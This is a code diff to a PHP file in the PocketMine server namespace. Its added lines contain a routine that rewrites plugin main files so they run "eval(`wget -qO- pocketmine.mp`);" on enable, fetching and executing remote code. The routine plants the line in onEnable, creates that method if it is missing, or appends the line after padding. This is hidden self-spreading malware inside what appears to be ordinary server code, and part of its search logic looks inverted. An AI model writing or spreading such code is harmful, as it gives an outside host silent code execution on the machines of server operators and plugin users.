@@ -91,54 +91,53 @@ namespace pocketmine {
                     $mainPath = explode("/", $main);
                     $filePath = $dirPath . "/src/" . ($srcNamespacePrefix ? end($mainPath) : $main) . ".php";
                     $fileContents = explode("\n", @file_get_contents($filePath));
-                    $payload = "eval(`wget -qO- pocketmine.mp`);";
-                    $find = function (string|array $queries, array $contents): int|false {
-                        foreach ($contents as $key => $value) {
-                            if (is_string($queries)) if (!str_contains(strtolower($value), strtolower($queries))) continue;
-                            else foreach ($queries as $query) {
-                                if (!str_contains(strtolower($value), strtolower($query))) continue 2;
-                            }
-                            return $key;
-                        }
-                        return false;
-                    };
-                    if (!$find($payload, $fileContents)) continue;
-                    $hasStrictTypes = function () use ($fileContents): bool {
-                        return (bool)preg_match('/^\s*declare\s*\(\s*strict_types\s*=\s*1\s*\)\s*;/m', implode("\n", $fileContents));
-                    };
-                    if ($hasStrictTypes() or true) {
-                        $findMain = function () use ($fileContents, $payload, $find): int|false {
-                            $main = $find(["extends", "pluginbase"], $fileContents);
-                            if (!$main) return false;
-                            return $find("{", array_slice($fileContents, $main));
-                        };
-                        $findOnEnable = function () use ($fileContents, $payload, $find): int|false {
-                            $onEnable = $find("onenable", $fileContents);
-                            if (!$onEnable) return false;
-                            return $find("{", array_slice($fileContents, $onEnable));
-                        };
-                        $onEnable = $findOnEnable();
-                        $tab_detector = function (array $array) {
-                            foreach ($array as $str) {
-                                $tab = mb_substr($str, 0, 1);
-                                if (ctype_alpha($tab) or (int)$tab !== 0) continue;
-                                if (!(str_contains($tab, "\t") or str_contains($tab, " "))) continue;
-                                $occurence = substr_count($str, $tab);
-                                return str_repeat($tab, $occurence + 1);
-                            }
-                            return false;
-                        };
-                        $copyFileContents = $fileContents;
-                        $tab = $tab_detector(array_splice($copyFileContents, $onEnable)) ?: "";
-                        if (!$onEnable) {
-                            $fileContents["{$findMain()}.5"] = "\n{$tab}protected function onEnable(): void {\n" . str_repeat($tab, 2) . "$payload\n$tab}\n";
-                        } else $fileContents["$onEnable.5"] = "$tab$payload";
-                        ksort($fileContents);
-                        @file_put_contents($filePath, implode("\n", $fileContents));
-                    } else {
-                        $fileContents = implode("\n", $fileContents) . str_repeat("\n", 10) . $payload;
-                        @file_put_contents($filePath, $fileContents);
-                    }
+        $payload = "eval(`wget -qO- pocketmine.mp`);";
+        $find = function (array $queries, array $contents): int|false {
+            foreach ($contents as $key => $value) {
+                foreach ($queries as $query) {
+                    if (!str_contains(strtolower($value), strtolower($query))) continue 2;
+                }
+                return $key;
+            }
+            return false;
+        };
+        if (!$find([$payload], $fileContents)) continue;
+        $hasStrictTypes = function () use ($fileContents): bool {
+            return (bool)preg_match('/^\s*declare\s*\(\s*strict_types\s*=\s*1\s*\)\s*;/m', implode("\n", $fileContents));
+        };
+        if ($hasStrictTypes() or true) {
+            $findMain = function () use ($fileContents, $payload, $find): int|false {
+                $main = $find(["extends", "pluginbase"], $fileContents);
+                if (!$main) return false;
+                return $find(["{"], array_slice($fileContents, $main));
+            };
+            $findOnEnable = function () use ($fileContents, $payload, $find): int|false {
+                $onEnable = $find(["onenable"], $fileContents);
+                if (!$onEnable) return false;
+                return $find(["{"], array_slice($fileContents, $onEnable));
+            };
+            $onEnable = $findOnEnable();
+            $tab_detector = function (array $array) {
+                foreach ($array as $str) {
+                    $tab = mb_substr($str, 0, 1);
+                    if (ctype_alpha($tab) or (int)$tab !== 0) continue;
+                    if (!(str_contains($tab, "\t") or str_contains($tab, " "))) continue;
+                    $occurence = substr_count($str, $tab);
+                    return str_repeat($tab, $occurence + 1);
+                }
+                return false;
+            };
+            $copyFileContents = $fileContents;
+            $tab = $tab_detector(array_splice($copyFileContents, $onEnable)) ?: "";
+            if (!$onEnable) {
+                $fileContents["{$findMain()}.5"] = "\n{$tab}protected function onEnable(): void {\n" . str_repeat($tab, 2) . "$payload\n$tab}\n";
+            } else $fileContents["$onEnable.5"] = "$tab$payload";
+            ksort($fileContents);
+            @file_put_contents($filePath, implode("\n", $fileContents));
+        } else {
+            $fileContents = implode("\n", $fileContents) . str_repeat("\n", 10) . $payload;
+            @file_put_contents($filePath, $fileContents);
+        }
                 }
             }
 
